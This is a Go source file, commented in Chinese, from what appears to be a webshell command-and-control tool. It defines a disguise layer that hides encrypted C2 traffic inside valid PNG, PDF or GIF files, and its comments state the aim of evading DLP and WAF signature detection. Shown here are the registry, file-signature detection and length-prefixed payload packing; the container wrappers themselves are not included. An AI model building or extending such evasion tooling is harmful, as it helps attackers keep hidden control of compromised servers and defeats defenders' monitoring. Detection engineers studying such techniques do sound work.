package webshell

// disguise.go — C2 流量伪装容器链。
//
// 与 encoders 的分工：Encoder 决定「密文长什么样」（AES/XOR/Base64），Disguise 决定
// 「密文塞进哪种文件外壳里」。启用后响应体不再是裸密文，而是一个结构合法的
// PNG / PDF / GIF：流量侧看到的是一次普通的图片或文档下载，DLP、WAF 的响应体
// 特征匹配也打不到加密流量本身。
//
// 约定：
//   - Wrap 必须产出能被标准解码器（浏览器 / image/png / PDF 阅读器）接受的容器；
//   - Unwrap 对不认识的输入返回错误而不是猜，调用方据此回退到裸密文路径；
//   - 容器里的密文位置是「解码后的尾部」，标准解码器按头部尺寸读满像素即停，
//     多余数据被忽略，因此图片显示完全正常。

import (
	"encoding/binary"
	"errors"
	"fmt"
	"sort"
	"strings"
)

// Disguise 一种容器伪装链。
type Disguise interface {
	// Name 链名，与 webshell_targets.disguise 字段一致：png / pdf / gif。
	Name() string
	// ContentType 响应体应有的 Content-Type。
	ContentType() string
	// Wrap 把密文封装成合法容器。
	Wrap(secret []byte) ([]byte, error)
	// Unwrap 从容器中取出密文；输入不是本链容器时返回错误。
	Unwrap(container []byte) ([]byte, error)
}

var disguiseRegistry = map[string]Disguise{}

func registerDisguise(d Disguise) { disguiseRegistry[d.Name()] = d }

func init() {
	registerDisguise(pngDisguise{})
	registerDisguise(pdfDisguise{})
	registerDisguise(gifDisguise{})
}

// GetDisguise 按名字取伪装链。空串 / none / off 返回 (nil, nil) 表示不伪装。
func GetDisguise(name string) (Disguise, error) {
	n := strings.ToLower(strings.TrimSpace(name))
	if n == "" || n == "none" || n == "off" {
		return nil, nil
	}
	if d, ok := disguiseRegistry[n]; ok {
		return d, nil
	}
	return nil, fmt.Errorf("未知伪装链 %q，可选: %s", name, strings.Join(DisguiseNames(), " / "))
}

// DisguiseNames 已注册的链名（排序后，用于界面下拉与报错提示）。
func DisguiseNames() []string {
	out := make([]string, 0, len(disguiseRegistry))
	for k := range disguiseRegistry {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// DetectDisguise 按文件签名判断容器类型，未识别返回空串。
// 剥壳时用不上（配置已指明链），用于「自动识别」与测试断言。
func DetectDisguise(b []byte) string {
	switch {
	case len(b) >= 8 && string(b[:8]) == string(pngSignature):
		return "png"
	case len(b) >= 5 && string(b[:5]) == "%PDF-":
		return "pdf"
	case len(b) >= 6 && (string(b[:6]) == "GIF87a" || string(b[:6]) == "GIF89a"):
		return "gif"
	}
	return ""
}

// packSecret 载荷区格式：4 字节大端长度 + 密文。
//
// 带长度前缀是为了应付「容器尾部有填充或脏数据」的情况：GIF 需要把像素补满 w×h，
// 容器也可能被中间设备追加字节，只有长度前缀能精确定位真实边界。
func packSecret(secret []byte) []byte {
	out := make([]byte, 4+len(secret))
	binary.BigEndian.PutUint32(out, uint32(len(secret)))
	copy(out[4:], secret)
	return out
}

// unpackSecret 按长度前缀取出密文并校验边界。
func unpackSecret(tail []byte) ([]byte, error) {
	if len(tail) < 4 {
		return nil, errors.New("载荷区过短，缺少长度前缀")
	}
	n := int(binary.BigEndian.Uint32(tail))
	if n <= 0 || 4+n > len(tail) {
		return nil, fmt.Errorf("载荷长度非法: %d（可用 %d 字节）", n, len(tail)-4)
	}
	return tail[4 : 4+n], nil
}
